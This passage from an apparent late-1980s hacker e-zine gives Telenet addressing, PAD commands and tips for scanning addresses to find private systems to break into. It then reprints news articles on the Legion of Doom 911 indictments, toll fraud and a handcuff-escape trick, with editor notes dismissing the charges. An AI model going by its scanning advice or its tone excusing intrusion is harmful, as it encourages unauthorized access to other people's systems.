the widespread use of the PSS network. For this reason we are including the
format for converting this 'local' address list into accessible hosts using
the standard scheme for telenet when accessed from 'foreign' networks.

For example, the local address: 20114 is 031102010001400 using the standard
format. 3110 is the DNIC (Data Network Identifier Code) for USS Telenet
and the zero preceding it is needed to make it clear to the foreign
network that the NUA (Network User Address) is a non-local address. Another
example, the local address is 203155 would be: 031102030015500 thus: 0DNIC NPA
00 XXX YY NPA is the area-code prefix (this is not necessarily an area code),
XXX is the sub-address and YY is the port which is usually 00.
For those unfamiliar with Telenet addressing, it generally follows the format
of grouping hosts into area codes. Thus, our directory is grouped accordingly.
There are 'non-standard' address prefixes which are rather obscure. These
commonly are owned by the same company or organization, whereas the area code
format contains hosts from many companies or organizations. The state an area
code resides is also listed to give you an idea of its location.
I have also included Telenet commands, mnemonic addresses, a somewhat current
list of pc-pursuit dialers, and a few things to consider for the would-be
Telenet scanner.

NOTES:

When accessing telenet from abroad, ignore the '$' after the address. This
denotes to users of the USA that an NUI (Network User ID) is required due to
the host not accepting collect charges for the connection.

Addresses preceded by a * refuse collect connections, but I was
unable to connect with them to determine what they were.

Addresses that have no comments next to them either hang up upon connection,
or I was unable to evoke any response from them.

Due to its immense size, this directory has been presented in a 'rougher' form
than our previous ones. The time to make it look 'pretty' was determined to
not be worth the effort.


TELENET COMMANDS
----------------

Most commands are listed in their four character form, however,
some may be abbreviated to merely one character (ie. C & D).

CONN            Allows user to connect to a specified host
DISA ECHO
DISA FLOW
DISA TFLO
DISC            Disconnect from current host
DTAPE           ?
ENAB ECHO
ENAB FLOW
ENAB TFLO
FULL            Full duplex
HANG            Hang up port
HALF            Half duplex
MAIL            Telemail service
PAR             Set parameters as specified
PAR?            Shows current parameter settings
RESE            Resets the node to inactive
RST             Sets parameters of remote host as specified
RST?            Shows current parameters of remote host
SET             Same as PAR
SET?            Same as PAR?
STAT            Shows current port
TAPE            ?
TELE            Telemail service
TEST CHAR       Test of all ascii characters
TEST ECHO       Test which echos all characters typed
TEST TRIA       Test which makes repeating triangle
TEST VERS       Shows current pad software version

The default command is CONN, so if an address is entered at the
'@' prompt, an attempt will be made to connect to that address.

A connection attempt may be aborted by sending a break signal.
This will put you back to the '@' prompt.

To return to the '@' prompt from an established connection the
user must type '@' followed by carriage return.

Normal 300/1200 users awaken the pad with two carriage returns.
2400 baud users must type '@' then carriage return.

To awaken the pad in the Uninet format, type:  carriage return,
period, then carriage return (upon initial connection).

To find the telenet dialup nearest your location, call 800-424-
9494 at 300/1200 baud.  At the '@' prompt, type 'MAIL'.  Enter
user name 'PHONES' with password 'PHONES'.

TELENET SCANNING TIPS
--------------------

There are a few things to take into consideration when using Telenet.
First of all, ignore error messages!  When something says rejecting, or
illegal address, or remote procedure error, try it again using sub-
addresses.  (IE:  100100a, 100100b...100100.99)  I have also found that
some addresses that are rejecting merely require that you connect to it
using an id.  Many of the things that respond with illegal address are
telenet pads.  Most of the public pads are in the following ranges:  0-20,
80-100, 180-190.  Many times you will find private pads.  If you are very,
very lucky you will find that pad-to-pad connections are possible to these
privately owned pads.  However, most of the time they are not operating, so
your chances of actually picking anything up are very slim.

When I did this directory I only checked the first few sub addresses on
addresses that didn't immediately connect, so needless to say there are
still a vast amount of systems out there.  One address I have responds with
rejecting until you connect to the sub address 74!  Imagine trying to go
that far on each of the thousands of rejecting and illegal addresses I
obtained in my scanning!  Maybe some other time.

There are several areas that I scanned that are not in this directory.
Mainly, these are areas where I didn't find anything.  So you don't waste
your time, all hosts in Canada are served through Datapac, so there is
nothing in areas prefixed with a Canadian area code.  There are also many
US areas that I guess are still striving for the Industrial Revolution, and
therefore have no systems online.  There are also several privately owned
prefixes that I didn't scan just because it would be a pain in the ass,
above and beyond the pain involved doing the main scanning.  The major ones
are 622 (NYNEX), 891, 892, 893, & 894 (OWNERS UNKNOWN).  There are also a
few others that go up and down daily, depending upon their mood.  I
wouldn't suggest that you all immediately start hacking these prefixes;
mainly because you will need an ID just to get a response other than
refused collect connection.

Lastly, if anyone finds any errors in the directory, or finds anything I
omitted, let me know, and I'll revise it.  Also, if anyone would like a
copy of the telix script I used to do this scanning, let me know.  This was
a bitch to do, but I think it was worth the trouble.  The next update won't
be for a year, as this should suffice for at least that long.

The Network News and Notes file contains reprints of articles that are of
interest to the majority of our intended readers. In this installment we
borrowed heavily from the CFCA (Communications Fraud Control Association)
Communicator since the newsletter deals specifically with issues relevant to
our readers. The CFCA is "a nonprofit educational organization founded in
1985 to help the telecommunications industry combat fraud."

Overall, do not let the titles mislead you. Every article contains interesting
and we hope useful information. Be sure to take the time and read into them
before skipping. Some are a little old but better late than never. If anyone
comes across any articles of interest, we would like to know about them. One
more note, all comments within brackets [], are remarks made by one of
the TJ editors.

The first two articles, as was stated in the Introduction, relate the various
trouble some noted members of the community ran into.

Title: Computer Hackers Accused of Scheme Against BellSouth
Author: Thomas M. Burton


   CHICAGO--Federal grand juries in Chicago and Atlanta indicted four computer
hackers in an alleged fraud scheme that authorities said could potentially
disrupt emergency "911" telephone service throughout nine Southern States.

   The men, alleged to be part of a closely knit cadre of computer hackers
known as the Legion of Doom, gained access to the computer system, controlling
telephone emergency service of BellSouth Corp., the Atlanta-based
telecommunications giant.

   BellSouth, through two subsidiaries, oversees phone service in Alabama,
Mississippi, Georgia, Tennessee, Kentucky, Louisiana, Florida, and the
Carolinas.

   The Chicago indictment said members of the Legion of Doom are engaged in
disrupting telephone service by entering a telephone company's computers and
changing the routing of telephone calls. The hackers in the group also
fraudulently obtain money from companies by altering information in their
computers, the indictment said.


   The hackers transferred stolen telephone-computer information from
BellSouth to what prosecutors termed a "computer bulletin board system"
in Lockport, Ill. In turn, the men planned to publish the computer data in a
hackers' magazine, the grand jury charged.

-----EDITOR'S NOTES:
   As always, ignorance and falsehoods are abound in most articles of this
nature. For the record, NO TELEPHONE SERVICE WAS INTENTIONALLY DISRUPTED DUE
TO THE ACCUSED MEMBERS. Furthermore, NO MONEY FROM COMPANIES WAS EVER
FRAUDULENTLY OBTAINED BY ALTERING INFORMATION IN THEIR COMPUTERS. These are
the typical WILD accusations made by law enforcement and further distorted
by the media in such cases. As for the bbs is Lockport, Ill. well it was
simply a legitimate information storage and retrieval system used by many,
many people for legitimate purposes of information exchange. It would be very
time consuming for the operator of said system to check every file on the
system as it was a UNIX based system with a lot of disk space. The hacker
magazine stated above is simply Phrack, Inc. put out by Knight Lightning and
Taran King. More comments after next article.

Title: Babes in high tech toyland nabbed
Author: Michael Alexander

   CHICAGO--- The U.S. Justice Department escalated its ware against computer
crime last week with two indictments against members of an alleged computer
hacker group, who are charged with stealing a copy of a 911 emergency computer
program from BellSouth Telephone Co., among several other crimes.

   In a seven-count indictment returned in Chicago, Robert X, 20 also known as
"The Prophet", is alleged to have used a computer to steal a copy of a
computer program owned and used by BellSouth that controls emergency calls to
the police, fire, ambulance and emergency services in cities throughout nine
Southern states. According to the indictment, after X stole the program --
valued at $79,449 -- he uploaded it to a computer bulletin board.

   The Chicago indictment further alleges that Craig Y, 19, also known as
"Knight Lightning" downloaded the 911 program to his computer at the
University of Missouri in Columbia, Mo., and edited it for publication in
"Phrack", a newsletter for computer hackers.

   X and Y allegedly intended to disclose the stolen information to other
computer hackers so that they could unlawfully access and perhaps disrupt
other 911 services, the Chicago indictment charged.

   In a second indictment returned in Atlanta, X and two others were charged
with additional crimes related to BellSouth systems.

   All four hackers allegedly are members of the Legion of Doom, described in
the indictments "as a closely knit group of about 15 computer hackers", in
Georgia, Texas, Michigan and several other states.

   BellSouth spokesmen refused to say when or how the intrusion was detected
or how a computer hacker was able to lift the highly sensitive and proprietary
computer program.

   "Hopefully, the government's action underscores that we do not intend to
view this as the work of a mischievous prankster playing in a high-tech
toyland", one spokesman said.

   A source within BellSouth said that much of what the hacker took was
documentation and not source code. "They did not disrupt any emergency
telephone service, and we are not aware of any impact on our customers", the
source said.

   William Cook, an assistant U.S. attorney in Chicago, declined to comment on
whether 911 service was actually disrupted. "It is a matter of evidence,", he
said.

   Cook also said that while the two hackers are charged with carrying out
their scheme between December 1988 and February 1989, the indictment came
after a year-long investigation. Though Cook refused to say how the hackers
were discovered or caught, it is believed that after the initial penetration
by one of the hackers, an intrusion task force was set up to monitor
subsequent security breaches and to gather evidence against the hackers.

   If convicted on all counts, X faces a prison sentence of up to 32 years and
a maximum fine of $222,000, and Y faces a prison sentence of 31 years and a
maximum fine of $122,000.

   The Atlanta indictment charged Robert X, Adam Z, 22 known as "The Urvile"
and also "Necron 99", and Frank XYZ, 23 known as "The Leftist", with eight
counts each of computer fraud, wire fraud, access code fraud and interstate
transportation of stolen property, among other crimes.

   If convicted, each defendant faces up to five years imprisonment and a
$250,000 fine on each count. The three illegally accessed Bellsouth computers
and obtained proprietary information that they distributed to other hackers,
the indictment alleged.

  ----EDITOR's NOTES: As is confirmed in this article, no telephone service
was disrupted. The extent of BellSouth's inadequacy regarding security matters
was not detailed in these articles. Here is a rundown of what may have
possibly happened: BellSouth's SBDN (Southern Bell Data Network) which is a
modified Telenet network that contains hundreds if not thousands of network
nodes (individual systems) may have been accessed during which time the system
that controls the entire network may have been possibly compromised. This
would allow someone to access just about any system on the network, since
Bellsouth consolidated most of their individual systems onto a large network
(economically not a bad idea, but a security nightmare indeed). This may allow
one to stumble onto systems dealing with 911. Since it may be interesting to
learn how such a system operates and how the 'automatic trace' is
accomplished, the documentation would be of some help. No need for any actual
programs however. Possibly, maybe, an article paraphrased the operation of 911
and was possibly to be distributed through the Phrack, Inc. newsletter.

The last names of those involved were omitted. Go look them up for yourself if
you think its that important.

Just for the record: KNIGHT LIGHTNING NEVER WAS A MEMBER OF LOD. Yet another
error in the reporting...LOD has half the 15 supposed number of members.

Another article followed the above one on the same page, by the same author:

Last week's disclosure of an alleged hacker theft of highly sensitive
BellSouth Telephone Co. documentation for a nine-state 911 emergency system
was the second serious security breach of a telephone company network to come
to light in as many months.

   In January, a trio of hackers was able to penetrate computer systems at
Pacific Bell Telephone Co. and eavesdrop on conversations and perpetrate other
criminal acts. [CW, Jan. 22].

   Just how vulnerable are the nation's telephone systems to hacker attacks?
Spokesmen for BellSouth and Pacific Bell insist that their systems are secure
and that they and other telephone companies routinely assess their
vulnerability to hackers.

   "Security is being constantly changed, every intrusion is studied,
passwords are changed," said Terry Johnson, manager of media relations for
BellSouth in Atlanta.

   Johnson however, declined to say how the hackers allegedly were able to
lift the documentation to a 911 emergency communication services program.

   "It is a rather serious computer security breach," said Richard Ichikawa, a
Honolulu based telecommunications consultant who specializes in designing and
installing 911 emergency systems. Stealing documentation, as the Legion of
Doom member is alleged to have done, many not be a particularly difficult task
for a savvy hacker, he said.

   Taking the actual program, while certainly possible, would be much more
challenging, however. The computer the controls enhanced 911 service is "quite
isolated" from the calling public, Ichikawa said.

   A recently published report to Congress by the Office of Technology
Assessment suggested that the security and survivability of the nation's
communication infrastructure is at greater risk to hacker attacks than ever
before. Business and government reliance on communications and information
based systems has increased, thus much more is at stake when those systems
fail, the report stated.

   The increased publicity of hacker attacks may help to curb attacks by
hackers, said Sanford Sherizen, a security consultant at Data Security
Systems, Inc., in Natick, Mass.

   Some law enforcement officials complain that the nation's telephone firms
do not cooperate as readily as they would expect when attacks of this sort
occur. "They [telecommunications providers] are the single biggest headache
law enforcers have right now," said Gail Thackery, Arizona stat assistant
district attorney.

   Regional Bell operating companies contacted last week disputed that
assertion.

Title: But are LD networks safe?

   Spread over vast distances and segmented by switches guarded by their own
passwords, long distance networks are generally safe from virus attacks.
According to Henry Kluepfel, Bellcore district manager of Security Planning
intruders can easily attain the same information that is available to vendors
and service providers. "If passwords are not changed regularly, intruders
can quickly wreak havoc".

   Scott Jarus, division director of Network Loss Prevention for Metromedia,
and a member of CFCA's Board of Directors, says that users of "outboard"
computer systems should not be assigned high level access to their company's
switches or networks. "Non-proprietary hardware and software that handle
such functions as billing collection and network database management are
targets for unauthorized access and viruses", he says.

   Mr. Kluepfel says that once hackers have the documentation they can send
details on how to crash the systems to hundreds of bulletin boards. "We
found that many system administrators didn't realize manufacturers install
rudimentary default passwords."

   Bellcore encourages using sophisticated codes and applying a variety of
defenses. "Don't simply rely on a dialback modem, or a good password", says
Mr. Kluepfel. "Above all, don't depend on a system to always perform as
expected. And remember that new employees don't know the administrative
measures the operator knows".

   Managers should advise clients on any needed internal analysis and
investigations, and keep abreast of technological advances when planning
their defenses.

Title: Secure those gray boxes

   After the FCC mandated that telcos provide test modes on the gray
[or green (ed. note)] connection boxes usually found outside structures,
there have been instances of persons surreptitiously clipping on handsets
or snapping in modular connections (RJ-11) to make long distance calls on the
residents' line. CFCA advises customers to padlock their boxes to deter such
thievery.

   John Venn, manger of Electronic Operations at PacBell's San Francisco
office, reports that the boxes they install have separate connections for
company and customer use, so that users have the option of securing access
to their portion. PacBell's side has a built-in lock, while customers have
padlock hasps.

Title: Product Description: Pen-Link analysis software
Author: Mike Murman

   Since 1986, Pen-Link, Ltd. of Lincoln Neb. has been producing software
that supports telecom investigations. Last July, the company introduced an
updated version of Pen-Link, a two-year-old program that accepts data from
most Dialed Number Recorders (DNRs) manufactured today, pools that information
into a common database structure, and allows the user to determine the calling
patterns and the codes that have been compromised.

   In today's ever-expanding telecommunications environment there is a need
for faster identification and documentation of abuser call patterns to assure
successful prosecutions. In applications of DNRs for investigative purposes,
Pen-Link programs have reduced the time normally needed to input, analyze and
report call data by as much as 90 percent. The result is improved productivity
and quicker response to customers' needs.

   The Pen-Link 2.0 program also provides several related features. First, it
is a communications program, meaning that if you are using a DNR with modem
capability or RS232 communication ports, the program can automatically load
your call records into a PC, eliminating the time needed to key-in call
record data.

   Second, Pen-Link has an autoload format section that takes call records
you have transferred and puts them into a standard record format. This is an
important feature, given that the program supports multiple types of DNR
hardware that all have unique call data formats.

   In short, you can use any combination of DNRs in your investigations with
Pen-Link and all data will be compatible. Furthermore, the program allows
you the flexibility of purchasing new DNRs of any type, and not worry about
duplicating your software expense or learning new software programs. [Notice
how he keeps saying "you" in this article? (ed.)]

   Finally, Pen-Link enables you to analyze and report on your call record
information. There are 15 different call analysis reports and 6 different
graphic reports. If these reports do not meet your needs, the program has a
report generator that allows you to customize your analysis and reports.

   Pen-Link is a dedicated program written in Turbo Pascal. The company
elected to start from scratch and develop its own software, rather than
simply adapting standard applications. There are two reasons for this
approach: dedicated software programs run more efficiently, so that if a
hacker is generating thousands of call records and you want to analyze and
report this information, the program can provide a report much faster than if
you were processing the data manually.

   The second reason behind this strategy is that users only need to learn
and understand the options for the pop-up menu format. Pen-Link also supports
color monitors.

   A manual editing feature allows you to enter your database and find
specific records by the criteria you have selected; then review and edit the
data. Manual editing also allows you to enter call data from old pen
registers that only produce paper strips containing call information.

   Another feature, the utilities section, provides several options to
manage call information stored in your computer. This allows you to archive
information to disk, then reload it later when it is needed. If your data
files become corrupted, you can reconstruct and reformat them by using the
utilities section. And if you wish to use your call data information in
another application program, Pen-Link's utilities allow  you to create an
ASCII text file of call information, which then can be read by these programs.
Furthermore, the program can accept ASCII text files from other DNR software
programs.

   The program calls for an IBM or compatible PC equipped with a hard drive,
operating under MS-DOS 2.1 or higher. Pen-Link currently supports the
following DNRs: JSI, Mitel, Racom, Voice ID, Hekimian, Bartec, Pamco, HDS,
and Positive Controls. If you are using a DNR that is not listed, Pen-Link,
LTD will program its software so it can automatically load call records from
your equipment.

   The use of DNRs that automatically transfer call record data saves your
security department considerable investigative time. Pen-Link's mission is
to provide telcom security departments with a sophisticated investigative
software tool that is easy to use, flexible and compatible.

Title: Extended Ky. case resolved

   A 21 year-old Kentucky man was successfully convicted October 27 on 14
counts of computer and toll fraud under a number of state statutes. The
defendant, John K. Detherage, pleaded guilty to using his personal computer to
identify authorization codes in order to place unauthorized long distance
calls valued at $27,000.

   Detherage had been indicted a year earlier by an Oldham County grand jury
on six felony counts related to the scam and two misdemeanor counts of
possessing stolen personal identification and calling card numbers. He was
later charged with two additional counts of possessing stolen PINs.

   Detherage originally was to have been tried in February 1988, but the case
was postponed when he pleaded guilty. He was sentenced at the Oldham County
Circuit Court at LaGrange to pay $12,000 in restitution, and relinquish all
computer equipment and software to the court.

   His charges included theft of services over $100; theft of services; four
counts of unlawful access to a computer, second degree; possession of stolen
credit or debit cards, and six counts of unlawful access to a computer. Four
other counts were dismissed.

   Kentucky has a number of statutes that can be applied to theft of telephone
services. Chapter 514.060 addresses theft of services, while 514.065 describes
the possession, use or transfer of a device for the theft of services. Theft
of services is defined to include telephone service, and the defendant was
charged with two counts under 514.060.

   Detherage was also charged with 10 counts (six felony and four misdemeanor)
under Chapter 434.580, which relates to the receipt of stolen credit cards.
Kentucky interprets computer crime as involving accessing of computer systems
to obtain money, property or services through false or fraudulent pretenses,
representations or promises.

Title: Industry Overview

   As major players in the telecom industry shore up the defenses on their
telephone and computer networks, criminals [who, us?] are turning to smaller,
less protected companies [its called survival of the fittest]. In 1988, the
use of stolen access codes to make free long distance calls continued to be
the favorite modus operandi among network intruders throughout the industry,
although code abuse leveled off or declined among large carriers with well
funded security organizations and substantial technical apparatus to defeat
most toll and network fraud.

   However, some resellers and PBX owners are being victimized by fraud of all
types, probably because most use access codes with only six or seven digits.
Such vulnerable systems will continue to be used by abusers to route long
distance calls overseas. Fraudulent calls placed on a compromised system
quickly accumulate charges the system owner must eventually pay.

   Many PBX's also lack effective systems able to detect irregular activities
and block fraudulent calls. Add to this the fact that several carriers may be
handling the inbound and outbound WATS lines, and investigator's jobs can
really become complex.

   The sharp increase in the abuse of voice store-and-forward systems, or
voice mail, that began alarming owners and manufacturers early last year will
continue through 1989. Last spring, traffickers began seizing private voice
mail systems to coordinate drug shipments. Messages can be quickly erased when
they are no longer needed. Dealers have been receiving mailbox numbers by
pager, then calling in recorded messages from public telephones.

   No matter how long a security code may be, if intruders obtain an 800
number to a voice mail system they can program a computer and take the time to
break it, because it won't cost them anything. Once accessed through a PBX,
intruders can exchange stolen lists of long distance access codes, usually
without the system owner's knowledge.

   The time it takes abusers to break into a voice mail system is
proportionate to the number of digits in a security code. A four-digit code
can, for example be beaten by a skilled computer operator in slightly over a
minute. [Clarification, this is probably through the use of default security
codes, not sequential or random scanning techniques. ed.] One problem is that
voice mail customers don't often know what features to select when buying a
system. And few manufactures take the initiative to advise customers of the
importance of security.

   Another problem that has been around for several years, subscription fraud,
will continue into 1989, although telcos have reduced it by making customer's
applications more detailed and comprehensive [like requiring customers to
supply their credit card numbers. This way if they skip town without paying
and the credit card is valid and not maxed out, the phone company can still
recover the money owned them. ed.], and by checking out potential customers
more thoroughly. Dishonest subscribers use false identification and credit
references to obtain calling cards and services, with no intention of paying.

   Intelligent software is available that aids switch and PBX owners in
identifying, screening and blocking fraudulent calls. Another precaution is
to add digits to access codes, because numbers of fewer than 10 digits cannot
withstand today's intruders. A number of carriers have already gone to 14
digits.

   Some larger carriers have been sending technical representative out to
reprogram PBX's, encourage customers to install better safeguards, and advise
them to shut down their systems at night and on weekends. Customers should
also expect to see billing inserts warning of the improved defenses against
fraud.

   As more companies break into the international market they will need solid
security safeguards to protect them against intrusions of their networks. A
small interexchange carrier (IC) in Alabama was hit hard recently by "phone
phreakers" soon after they opened overseas service.

   Other start-ups find themselves desperately trying to play catch up after
blithely operating several years without a hitch. An IC with 30,000 customers
in Southern California increased its seven-digit access codes to ten digits
and it aggressively pursuing five groups of hackers its investigators
uncovered after discovering that company-issued personal identification
numbers were posted on computer bulletin boards.

   In the final analysis, one fact emerges: widespread cooperation among
injured parties will ensure quicker results and conserve vital company
resources.

Title: Keep an Ear Out for New Voice Technology
Author: Matt Kramer

   With the rise in digital transmission of voice and data, it's easy to
assume that voice and data have merged into a muddle of indiscriminate
material, with voice indistinguishable from data. After all, a bit's a bit,
right?

   But, those people in the white lab coats keep coming up with new ways to
use voice technology.

   The telephone companies are the ones poised to make the most of this
technology. U.S. Sprint recently announced that it was experimenting with the
use of "voice prints"--a recording of a verbal password that would be used to
help identify authorized subscribers using their U.S. Sprint telephone charge
cards, which would help cut down on hackers trying to steal telephone service.
Subscribers would record a voice print of a verbal password. Then, when they
were using their charge cards, they would repeat the passwords to verify their
identities.

   Northern Telecom has embarked on its own efforts to bring voice-recognition
technology to public telephone service. it is selling telephone companies a
new billing service that uses voice-recognition technology to automate collect
and third-number billing calls.

   Called the Automated Alternate Billing Service (AABS), the system calls the
party to be billed and "asks" if the charges will be accepted. The Northern
Telecom switch "listens" to the response and either completes the call or
informs the calling party that the charges have been refused.

   Northern Telecom also plans to use voice technology to offer other
features, such as allowing the system to announce the caller's name in the
party's own voice and stating the call's origin, such as the name of a city,
a university or an institution.

   The big draw for phone companies, of course, is reduction of personnel
costs, since no human operator assistance is needed. That's an option for lots
of corporate financial officers who have been attracted to automated-attendant
phone systems because they can replace a bevy of switchboard operators.

   What would be interesting about the Northern Telecom technology is to see
if it can be expanded to other gear, such as private branch exchanges, and if
if can beef up the automated-attendant feature. Rather than require callers
to punch a lot of buttons to get in touch with someone, perhaps voice
recognition could be used to "listen" for a name and then direct the call to
the appropriate party. That would be especially useful in situations where you
don't know the exact extension of whomever you are calling. Trying to maneuver
around an on-line telephone directory can be a real pain in the neck.

   At the same time, voice-recognition technology can be paired with voice
mail so that users can access their voice mailboxes without having to punch in
an identification number or password or to deal with a menu. It would be a lot
easier to just say, "Read messages".

   There's still a lot of potential to be developed in voice technology.

Title: MCI to Provide Transition to ISDN
Author: Matt Kramer

   MCI Communications Inc. hopes to give its customers a smoother transition
to ISDN with new services that offer many of the technology's features without
requiring costly upgrades to ISDN-compatible equipment.

   The communications company recently announced new Integrated Services
Digital Network and "ISDN-equivalent" services that will provide MCI customers
with network-configuration, control and management features, according to
company officials.

   The equivalent services, which will be available this fall, run over
existing in-band signaling channels. True ISDN services require a separate
out-of-band D channel for signalling.

   MCI's full ISDN services are scheduled for delivery in the first quarter of
next year.

   The equivalent services, while not providing the full ISDN feature set, are
designed to introduce customers to the benefits of ISDN before requiring them
to make the investment in ISDN-compatible telecommunications gear, officials
said.

   "While they may not want to make that expenditure now, they certainly want
to have ISDN-like services available", said Kevin Sharer, senior vice
president of sales and marketing at MCI, in Washington.

   The equivalent products include the MCI 800 Enhanced Services Package,
which allows customers with dedicated access lines to receive the number of
the calling party just prior to receiving the call. This Automatic Number
Identification (ANI) is then used to query a database to bring up a customer's
account or other information, according to officials.

   Northern Telecom Inc. and Rockwell International Corp. have developed new
software for their private branch exchanges that permits the switches to
handle in-band ANI transmission.

   Some observers expect the equivalent services will be useful in the
evolution from existing telecommunications to ISDN. "If all you need is ANI,
then the equivalent services might be just what you want", said Claude Stone,
vice president of product development at the First National Bank of Chicago
and vice chairman of the national ISDN Users Forum.

Title: Sheriff's prisoners find handcuffs are a snap to get out of
Author: unknown

   Ten jail prisoners who discovered an ingenious way to escape from handcuffs
are sending alarms across the nation. Emergency bulletins will be sent to law
enforcement agencies via teletype machines nationwide. On Friday, deputies
were taking 10 prisoners from the jail downtown to another one in the city.
All were handcuffed.  "When the deputy opened the back of the van, all 10 guys
were smiling and said, 'See what we did,'" the Sheriff said. Each prisoner
held up his arms to show broken handcuffs.

   The culprit was a simple seat belt clip. The circular cuffs are connected
with a chain, held tightly to each cuff by a swivel-head link that moves
freely to ensure that the chain cannot be twisted when the wrists move. Seat
belt clips typically have one or two holes, or slots, that lock them into
place with the buckle. The prisoners learned that jamming the swivel-head on
the clip stops the swivel head from turning freely. "A quick twist of the
wrist, and the chain shears off at the cuff," the sheriff said.

   The sheriff ordered seat belts removed from jail vans. He also ordered
that the prisoners in cruisers be handcuffed with their hands behind their
back and the seat belts locked firmly across them. Deputies often handcuffed
prisoners' hands in front of their bodies. But even if prisoners were cuffed
behind their backs, it would not be difficult for them to manipulate the
swivel head into a seat belt buckle and twist themselves free -- if they
could reach the seat belt. "This is a danger to every law enforcement officer
in the country", the sheriff said.

   Handcuff manufacturers contacted Friday are studying the possibility of
redesigning the handcuffs by enlarging the swivel head or placing some type
of shroud over it. "People in jail have 24 hours a day to figure a way out"
said the sheriff.

   "Although only 10 people know the technique, I guarantee that the entire
jail population will know how to do it before the day is up,". "The only
people who won't know about it is law enforcement officers".  The sheriff
met Friday with representatives of several local and federal agencies. An
FBI spokesman said the escape technique will be described in the FBI's
nationally distributed LAW ENFORCEMENT BULLETIN.

   Although the sheriff was grateful to learn about the technique from
prisoners who did not try to escape, he was not amused. He told deputies,
"Charge them with destruction of county property. We'll see how funny they
think that is."

Title: Federal grand jury probes Cincinnati Bell wiretapping flap
Source: Data Communications
Issue: November 1988
Author: John Bush

   A federal grand jury in Ohio is investigating illegal wiretapping
allegations involving two former employees of Cincinnati Bell who claim the
telephone company ordered them for more than a decade to eavesdrop on
customers.

   In addition, an attorney who filed a class-action lawsuit against
Cincinnati Bell on behalf of the people and companies who were allegedly
wiretapped, says he is trying to prove that the telephone company sold the
information gained from the electronic surveillance.

   A Cincinnati Bell spokesperson denied the charges, saying they were
trumped-up by the two former employees, who are seeking revenge after being
fired by the telephone company.

   The lawsuit has been filed against Cincinnati Bell Inc. on behalf of
Harold Mills, a former police lieutenant and former commander of the
Cincinnati Vice Squad, as well as a number of other individuals and companies.
Among the alleged victims mentioned in the complaint were Sen. Howard
Metzenbaum (D-Ohio) and Proctor and Gamble Co. (Cincinnati, Ohio).

   Gene Mesh, the attorney who filed the lawsuit, believes the Cincinnati Bell
case is not an isolated incident but a trend...an explosion of cancer that
"this kind of thing [wiretapping] has developed its own markets."

   When asked if Cincinnati Bell was selling the information gained from
tapping, Mesh said "we are proceeding along evidentiary lines to prove this."

   Thus far, the civil action hinges on the testimony of two former Cincinnati
Bell employees, Leonard Gates, a supervisor, and Robert Draise, an installer
who at one time worked for Gates. Their combined testimony states that, under
the auspices of Cincinnati Bell, they conducted over 1,200 illegal wiretaps
from 1972 to the present.

   According to Gates, as a result of the Proctor and Gamble wiretap, "we
were into all of P&G's databases." In addition, both Gates and Draise claim
to have been in on illegal wiretaps of General Electric Co.'s Aircraft Engines
Division near Cincinnati. Draise also claims that he was ordered to identify
all of GE's facsimile and modem lines for Cincinnati Bell.

   Neither Proctor and Gamble nor General Electric would comment. However
Sen. Howard Metzenbaum's Washington, D.D., office says that the Senator
"found the news shocking and is awaiting more information to see if it
[the wiretap] actually happened.

   Meanwhile Cincinnati Bell maintains that the suit and allegations are
merely Gates's and Draise's way of getting back at the phone company for
having fired them.

   Cyndy Cantoni, a spokesperson for Cincinnati Bell, said that "we have heard
the allegations that we wiretapped, but if Draise or Gates did any tapping, it
wasn't done at Cincinnati Bell's request."

   Cantoni also cited a letter from Cincinnati Bell President Ray Clark that
went out to all Cincinnati Bell employees in the wake of the publicity
surrounding the wiretapping accusations. The letter stated that Gates had been
warned in April 1985 against continuing an affair with an employee he had been
supervising and who had accused him [Gates] of sexual harassment, according to
Cantoni.

   The letter went on to say that Gates reacted to the warning with
insubordination and threats and "carried on a campaign against the company."
As a result, Gates was fired for insubordination, says Cantoni. Robert Draise
was fired after he was convicted of misdemeanor wiretapping charges for
tapping the phone line of a friend's girlfriend, Cantoni says.

   Cincinnati Bell is an independent telephone company that was allowed to
keep the "Bell" trademark after divestiture, since it is older than AT&T,
says Cantoni.
